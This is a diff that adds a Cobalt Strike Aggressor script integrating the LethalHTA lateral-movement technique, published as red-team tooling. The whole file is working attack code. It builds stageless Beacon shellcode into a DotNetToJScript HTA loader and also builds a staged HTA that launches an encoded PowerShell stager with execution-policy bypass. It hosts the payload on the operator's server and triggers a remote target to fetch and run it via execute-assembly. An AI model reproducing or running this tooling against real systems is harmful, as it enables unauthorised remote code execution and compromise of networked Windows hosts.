@@ -1,0 +1,238 @@
+#
+# LethalHTADotNet integration for Cobalt Strike
+#
+# (c) 2018 Code White GmbH - Markus Piéton
+#
+# CNA-Script is inspired by rsmudge/stagelessweb.cna
+# (https://gist.github.com/rsmudge/629bd4ddce3bbbca1f8c16378a6a419c)
+#
+debug(5);
+
+# define our top-level menubar
+menubar("&LethalHTA", "lethalhta");
+
+global('$HTA_TEMPLATE');
+
+$LETHAL_HTA_URL = "https://codewhitesec.blogspot.com/2018/07/lethalhta.html";
+
+$PATH_TO_SCLOADER = script_resource("SCLoader.bin");
+$PATH_TO_DOTNETJSCRIPT_TEMPLATE = script_resource("dotNetJScriptTemplate.hta");
+$PATH_TO_LETHALHTPDOTNET = script_resource("LethalHTADotNet.exe");
+
+$HTA_TEMPLATE = '<html><head><HTA:APPLICATION ID="HelloBeacon"><script language="jscript">new ActiveXObject("WScript.Shell").Run("cmd /c REPLACEMEORELSE");</script></head><body><script>self.close();</script></body></html>';
+
+# setup our stageless HTA attack
+sub setup_stageless {
+	local('%options $target $ssl $bid $hta $shellcode $readytouse $lhtadotnet $url $handle $scloader $payload $payloadx86 $index_payload_x86 $payloadx64 $index_payload_x64');
+
+	%options = $3;
+
+	$target = %options["target"];
+	$bid = %options["bid"];
+
+	if ($target eq "") {
+		blog($bid, , "Target not specified!");
+		return;
+	}
+
+	###############################################################
+	## Clean-up already registered content and redirects
+
+	site_kill(%options["port"], %options["uri"]);
+
+	if (%options["rdr"] eq "true") {
+		brportfwd_stop($bid, %options["rdrport"]);
+	}
+
+	###############################################################
+	## Read SCLoader.bin
+
+	# read in the executable template
+	$handle = openf($PATH_TO_SCLOADER);
+	$scloader = readb($handle, -1);
+	closef($handle);
+
+	# find the location of our shellcode in SCLoader
+	$index_payload_x86 = indexOf($scloader, "\x01\x02\x03\x04\x05\x06\x07");
+	$index_payload_x64 = indexOf($scloader, "\x07\x06\x05\x04\x03\x02\x01");
+
+	###############################################################
+	## Generate Payloads (x86 and x64 stageless)
+
+	# generate our stageless x86 raw-payload. We're going to make *this* function
+	# the callback for this call. That's why we yield after.
+	artifact_stageless(%options["listener"], "raw", "x86", %options["proxy"], $this);
+	yield;
+	
+	# this function is now resumed after &artifact_stageless finished. $1 is our payload.
+	$payloadx86 = gzip($1);
+
+	# generate our stageless x64 raw-payload. We're going to make *this* function
+	# the callback for this call. That's why we yield after.
+	artifact_stageless(%options["listener"], "raw", "x64", %options["proxy"], $this);
+	yield;
+	
+	# this function is now resumed after &artifact_stageless finished. $1 is our payload.
+	$payloadx64 = gzip($1);
+
+	# Replace dummy bytes inside SCLoader with our shellcode
+	$payload = replaceAt($scloader, "$[204800]payloadx86", $index_payload_x86);
+	$payload = replaceAt($payload, "$[204800]payloadx64", $index_payload_x64);
+	$payload = base64_encode($payload);
+
+	###############################################################
+	## Create HTA String
+
+	# read in the executable template
+	$handle = openf($PATH_TO_DOTNETJSCRIPT_TEMPLATE);
+	$hta = readb($handle, -1);
+	closef($handle);
+
+	$hta = strrep($hta, 'REPLACETHISWITHSERIALIZEDOBJECT', $payload);
+
+	###############################################################
+	## Host the HTA file
+
+	$ssl = iff(%options["ssl"] eq "true", true, false);
+
+	# host the payload!
+	$url = site_host(%options["host"], %options["port"], %options["uri"], $hta, "text/plain", "LethalHTA \(.NET - stageless - x86/x64\)", $ssl);
+
+	if ($url eq "") {
+		blog($bid, , "Error hosting content!");
+		return;
+	}
+
+	###############################################################
+	## Beacon Redirect
+
+	# check if we need to set-up a Beacon redirect
+	if (%options["rdr"] eq "true") {
+		$url = iff($ssl, "https", "http") . "://" . binfo($bid, "internal") . ":" . %options["port"] . %options["uri"];
+		brportfwd($bid, %options["rdrport"], %options["host"], %options["port"]);
+	}
+
+	###############################################################
+	## Go Go Go!
+	blog($bid, , "USING: execute-assembly " . $PATH_TO_LETHALHTPDOTNET . " \"$target\" \"$url\"");
+	bexecute_assembly($bid, $PATH_TO_LETHALHTPDOTNET, "\"$target\" \"$url\"");
+}
+
+#
+sub testcmd {
+	local('%options $bid $meta $key $value');
+	%options = $3;
+
+	$meta = bdata(%options["bid"]);
+
+	foreach $key => $value ($meta) {
+		println("$[20]key : $value");
+	}
+}
+
+#
+sub setup_powershell {
+	local('%options $target $ssl $bid $hta $shellcode $readytouse $lhtadotnet $url');
+	%options = $3;
+
+	$target = %options["target"];
+	$bid = %options["bid"];
+
+	if ($target eq "") {
+		blog($bid, , "Target not specified!");
+		return;
+	}
+
+	###############################################################
+	## Clean-up already registered content and redirects
+
+	site_kill(%options["port"], %options["uri"]);
+
+	if (%options["rdr"] eq "true") {
+		brportfwd_stop($bid, %options["rdrport"]);
+	}
+
+	###############################################################
+	## Generate Payload
+
+	$shellcode  = shellcode(%options["listener"], false, "x86");
+	$readytouse = powershell_encode_stager($shellcode);
+
+	###############################################################
+	## Create HTA String
+
+	$hta = strrep($HTA_TEMPLATE, 'REPLACEMEORELSE', "powershell -ep bypass -enc $readytouse");
+
+	###############################################################
+	## Host the HTA file
+
+	$ssl = iff(%options["ssl"] eq "true", true, false);
+
+	# host the payload!
+	$url = site_host(%options["host"], %options["port"], %options["uri"], $hta, "text/plain", "LethalHTA \(powershell - staged - x86\)", $ssl);
+
+	if ($url eq "") {
+		blog($bid, , "Error hosting content!");
+		return;
+	}
+
+	###############################################################
+	## Beacon Redirect
+
+	# check if we need to set-up a Beacon redirect
+	if (%options["rdr"] eq "true") {
+		$url = iff($ssl, "https", "http") . "://" . binfo($bid, "internal") . ":" . %options["port"] . %options["uri"];
+		brportfwd($bid, %options["rdrport"], %options["host"], %options["port"]);
+	}
+
+	###############################################################
+	## Go Go Go!
+	blog($bid, , "USING: execute-assembly " . $PATH_TO_LETHALHTPDOTNET . " \"$target\" \"$url\"");
+	bexecute_assembly($bid, $PATH_TO_LETHALHTPDOTNET, "\"$target\" \"$url\"");
+}
+
+sub show_dialog {
+	local('$dialog %defaults');
+
+	# setup our defaults
+	%defaults["target"]  = "";
+	%defaults["uri"]  = "/a";
+	%defaults["host"] = localip();
+	%defaults["port"] = 80;
+	%defaults["proxy"]  = "";
+	%defaults["rdr"] = false;
+	%defaults["rdrport"] = 80;
+	%defaults["ssl"] = false;
+
+	# create our dialog
+	$dialog = dialog($1, %defaults, $3);
+	dialog_description($dialog, $2);
+	drow_beacon($dialog, "bid", "Session: ");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_text($dialog, "target", "Target (IP/Hostname): ");
+	drow_text($dialog, "uri", "URI Path: ", 20);
+	drow_text($dialog, "host", "HTTP(S) Host: ");
+	drow_text($dialog, "port", "HTTP(S) Port: ");
+	drow_checkbox($dialog, "ssl", "Use SSL/TLS: ");
+	if (-istrue $4) {
+		drow_proxyserver($dialog, "proxy", "Proxy: ");
+		drow_checkbox($dialog, "rdr", "Redirect via Beacon: ", "Use Beacon as the HTTP Host (via port forwarding)");
+		drow_text($dialog, "rdrport", "HTTP Redirect-Port: ", "Ignored if 'Redirect via Beacon' isn't used.");
+	}
+	dbutton_action($dialog, "Launch");
+	dbutton_help($dialog, $LETHAL_HTA_URL);
+
+	# show our dialog
+	dialog_show($dialog);
+}
+
+#
+popup lethalhta {
+	item "HTA &PowerShell Delivery (staged - x86)" {
+		show_dialog("PowerShell LethalHTA (staged)", "A staged PowerShell version of the LethalHTA attack.", &setup_powershell);
+	}
+
+	item "HTA .NET In-Memory Delivery (stageless - x86/x64 dynamic)" {
+		show_dialog(".NET LethalHTA (stageless)", "A stageless .NET version of the LethalHTA attack using DotNetToJScript.", &setup_stageless, true);
+	}
+}
